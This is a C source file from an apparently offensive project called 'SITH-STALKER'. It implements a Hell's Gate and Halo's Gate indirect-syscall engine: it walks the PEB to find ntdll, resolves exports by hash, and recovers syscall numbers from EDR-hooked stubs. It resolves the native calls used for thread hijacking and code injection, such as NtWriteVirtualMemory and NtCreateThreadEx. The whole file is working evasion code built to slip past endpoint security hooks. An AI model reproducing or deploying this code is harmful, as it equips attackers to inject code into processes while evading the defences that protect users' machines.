/*
 * gate.c — Indirect Syscall Engine Implementation
 * ═══════════════════════════════════════════════════════════════════
 * SITH-STALKER — 22DIV / george wu
 *
 * Hell's Gate + Halo's Gate SSN extraction from ntdll.dll.
 * Zero API calls for module resolution — pure PEB/PE parsing.
 *
 * COMPILE (with gate_stub.asm):
 *   ml64.exe /c src\gate_stub.asm /Fo:src\gate_stub.obj
 *   cl.exe /O1 /GS- /utf-8 src\gate.c src\test_gate.c src\gate_stub.obj /Fe:test_gate.exe
 */

#include "gate.h"
#include <winternl.h>

/* ═══════════════════════════════════════════════════════════════════
 * NTDLL STUB BYTE PATTERNS
 * ═══════════════════════════════════════════════════════════════════
 * Every Nt* syscall stub in ntdll follows this pattern:
 *
 *   4C 8B D1       mov r10, rcx       ; save 1st arg (rcx clobbered by syscall)
 *   B8 XX XX 00 00 mov eax, <SSN>     ; System Service Number
 *   ...            (varies: test, jne for Wow64 check)
 *   0F 05          syscall
 *   C3             ret
 *
 * SSN is at stub[4] (low byte) and stub[5] (high byte), little-endian.
 *
 * When an EDR hooks the stub, it typically patches byte[0] to 0xE9 (JMP)
 * to redirect execution to the EDR's inspection routine. The SSN bytes
 * may still be present but the entry point is hijacked.
 *
 * Halo's Gate: if our target is hooked, we scan neighboring stubs
 * (which are sequentially numbered). If stub N±K is clean, then
 * target_SSN = neighbor_SSN ∓ K. SSNs are densely packed integers.
 * ═══════════════════════════════════════════════════════════════════ */

#define STUB_SIZE 32  /* approximate size of each Nt* stub */

/* Clean stub signature: 4C 8B D1 B8 */
static BOOL is_clean_stub(BYTE *addr) {
    return (addr[0] == 0x4C &&
            addr[1] == 0x8B &&
            addr[2] == 0xD1 &&
            addr[3] == 0xB8);
}

/* Extract SSN from a verified clean stub */
static DWORD extract_ssn(BYTE *addr) {
    return ((DWORD)addr[5] << 8) | (DWORD)addr[4];
}

/* Find the syscall;ret gadget (0F 05 C3) within a stub.
 * Used as the indirect jump target — execution returns FROM ntdll. */
static void *find_syscall_ret(BYTE *addr) {
    int i;
    for (i = 0; i < STUB_SIZE; i++) {
        if (addr[i] == 0x0F && addr[i+1] == 0x05 && addr[i+2] == 0xC3)
            return &addr[i];
    }
    return NULL;
}

/* ═══════════════════════════════════════════════════════════════════
 * DJB2 HASH
 * ═══════════════════════════════════════════════════════════════════ */

DWORD gate_hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + c;
    return hash;
}

/* ═══════════════════════════════════════════════════════════════════
 * PEB WALK — FIND NTDLL BASE
 * ═══════════════════════════════════════════════════════════════════
 * Process Environment Block → PEB_LDR_DATA → InMemoryOrderModuleList.
 *
 * Module load order (always):
 *   [0] = the EXE itself
 *   [1] = ntdll.dll
 *   [2] = kernel32.dll (or kernelbase.dll)
 *
 * We walk to entry [1] and read the DllBase.
 * __readgsqword(0x60) reads the PEB pointer from the GS segment
 * register (TEB→PEB offset 0x60 on x64).
 * ═══════════════════════════════════════════════════════════════════ */

HMODULE gate_find_ntdll(void) {
    PEB *peb;
    PEB_LDR_DATA *ldr;
    LIST_ENTRY *head, *entry;
    LDR_DATA_TABLE_ENTRY *mod;

    peb = (PEB *)__readgsqword(0x60);
    if (!peb || !peb->Ldr) return NULL;

    ldr = peb->Ldr;
    head = &ldr->InMemoryOrderModuleList;

    /* Skip entry [0] (the EXE), get entry [1] (ntdll.dll) */
    entry = head->Flink;       /* [0] = EXE */
    if (!entry) return NULL;
    entry = entry->Flink;      /* [1] = ntdll.dll */
    if (!entry) return NULL;

    mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
    return (HMODULE)mod->DllBase;
}

/* ═══════════════════════════════════════════════════════════════════
 * PE EXPORT TABLE PARSING
 * ═══════════════════════════════════════════════════════════════════
 * Given ntdll's base, parse the PE headers to reach the export
 * directory. Then walk the Name → Ordinal → Function tables to
 * find target functions by DJB2 hash.
 *
 * This replaces GetProcAddress entirely — no API call needed.
 * ═══════════════════════════════════════════════════════════════════ */

typedef struct _EXPORT_CTX {
    BYTE  *base;
    DWORD *names;       /* RVA array → function name strings */
    WORD  *ordinals;    /* ordinal array → index into funcs */
    DWORD *funcs;       /* RVA array → function addresses */
    DWORD  count;       /* NumberOfNames */
} EXPORT_CTX;

static BOOL parse_exports(HMODULE ntdll, EXPORT_CTX *ctx) {
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS64 *nt;
    IMAGE_EXPORT_DIRECTORY *exp;
    DWORD exp_rva;

    ctx->base = (BYTE *)ntdll;
    dos = (IMAGE_DOS_HEADER *)ctx->base;

    if (dos->e_magic != IMAGE_DOS_SIGNATURE)
        return FALSE;

    nt = (IMAGE_NT_HEADERS64 *)(ctx->base + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return FALSE;

    exp_rva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (!exp_rva)
        return FALSE;

    exp = (IMAGE_EXPORT_DIRECTORY *)(ctx->base + exp_rva);

    ctx->names    = (DWORD *)(ctx->base + exp->AddressOfNames);
    ctx->ordinals = (WORD *)(ctx->base + exp->AddressOfNameOrdinals);
    ctx->funcs    = (DWORD *)(ctx->base + exp->AddressOfFunctions);
    ctx->count    = exp->NumberOfNames;

    return TRUE;
}

/* ═══════════════════════════════════════════════════════════════════
 * HALO'S GATE — RECOVER SSN FROM NEIGHBOR STUBS
 * ═══════════════════════════════════════════════════════════════════
 * When a stub is hooked (JMP patch at entry), scan neighboring
 * stubs in the export table. SSNs are sequential — if we find a
 * clean stub K positions away, target_SSN = neighbor_SSN ± K.
 *
 * Search radius: ±20 neighbors (covers any realistic hook density).
 * ═══════════════════════════════════════════════════════════════════ */

#define HALO_RADIUS 20

static BOOL halo_gate(EXPORT_CTX *ctx, DWORD target_idx, SYSCALL_ENTRY *entry) {
    int delta;

    for (delta = 1; delta <= HALO_RADIUS; delta++) {
        /* Check downward neighbor (higher SSN) */
        if (target_idx + delta < ctx->count) {
            BYTE *neighbor = ctx->base + ctx->funcs[ctx->ordinals[target_idx + delta]];
            if (is_clean_stub(neighbor)) {
                DWORD neighbor_ssn = extract_ssn(neighbor);
                entry->ssn = neighbor_ssn - delta;
                entry->syscall_addr = find_syscall_ret(neighbor);
                entry->resolved = (entry->syscall_addr != NULL);
                entry->was_hooked = TRUE;
                return entry->resolved;
            }
        }
        /* Check upward neighbor (lower SSN) */
        if (target_idx >= (DWORD)delta) {
            BYTE *neighbor = ctx->base + ctx->funcs[ctx->ordinals[target_idx - delta]];
            if (is_clean_stub(neighbor)) {
                DWORD neighbor_ssn = extract_ssn(neighbor);
                entry->ssn = neighbor_ssn + delta;
                entry->syscall_addr = find_syscall_ret(neighbor);
                entry->resolved = (entry->syscall_addr != NULL);
                entry->was_hooked = TRUE;
                return entry->resolved;
            }
        }
    }

    return FALSE;
}

/* ═══════════════════════════════════════════════════════════════════
 * GATE RESOLVE — EXTRACT SSN FOR A SINGLE FUNCTION
 * ═══════════════════════════════════════════════════════════════════ */

BOOL gate_resolve(HMODULE ntdll, DWORD fn_hash, SYSCALL_ENTRY *entry) {
    EXPORT_CTX ctx;
    DWORD i;

    memset(entry, 0, sizeof(*entry));

    if (!parse_exports(ntdll, &ctx))
        return FALSE;

    for (i = 0; i < ctx.count; i++) {
        char *name = (char *)(ctx.base + ctx.names[i]);
        if (gate_hash(name) == fn_hash) {
            BYTE *addr = ctx.base + ctx.funcs[ctx.ordinals[i]];

            /* Hell's Gate — clean stub */
            if (is_clean_stub(addr)) {
                entry->ssn = extract_ssn(addr);
                entry->syscall_addr = find_syscall_ret(addr);
                entry->resolved = (entry->syscall_addr != NULL);
                entry->was_hooked = FALSE;
                return entry->resolved;
            }

            /* Halo's Gate — hooked, recover from neighbor */
            return halo_gate(&ctx, i, entry);
        }
    }

    return FALSE;
}

BOOL gate_resolve_by_name(HMODULE ntdll, const char *fn_name, SYSCALL_ENTRY *entry) {
    return gate_resolve(ntdll, gate_hash(fn_name), entry);
}

/* ═══════════════════════════════════════════════════════════════════
 * GATE INIT — RESOLVE ALL VADER TARGET FUNCTIONS
 * ═══════════════════════════════════════════════════════════════════ */

int gate_init(GATE_TABLE *table) {
    HMODULE ntdll;
    int resolved = 0;

    memset(table, 0, sizeof(*table));

    ntdll = gate_find_ntdll();
    if (!ntdll) return 0;

    resolved += gate_resolve(ntdll, HASH_NtOpenThread,           &table->NtOpenThread);
    resolved += gate_resolve(ntdll, HASH_NtSuspendThread,        &table->NtSuspendThread);
    resolved += gate_resolve(ntdll, HASH_NtResumeThread,         &table->NtResumeThread);
    resolved += gate_resolve(ntdll, HASH_NtGetContextThread,     &table->NtGetContextThread);
    resolved += gate_resolve(ntdll, HASH_NtSetContextThread,     &table->NtSetContextThread);
    resolved += gate_resolve(ntdll, HASH_NtAllocateVirtualMemory, &table->NtAllocateVirtualMemory);
    resolved += gate_resolve(ntdll, HASH_NtWriteVirtualMemory,   &table->NtWriteVirtualMemory);
    resolved += gate_resolve(ntdll, HASH_NtProtectVirtualMemory, &table->NtProtectVirtualMemory);
    resolved += gate_resolve(ntdll, HASH_NtCreateThreadEx,       &table->NtCreateThreadEx);
    resolved += gate_resolve(ntdll, HASH_NtClose,                &table->NtClose);

    return resolved;
}
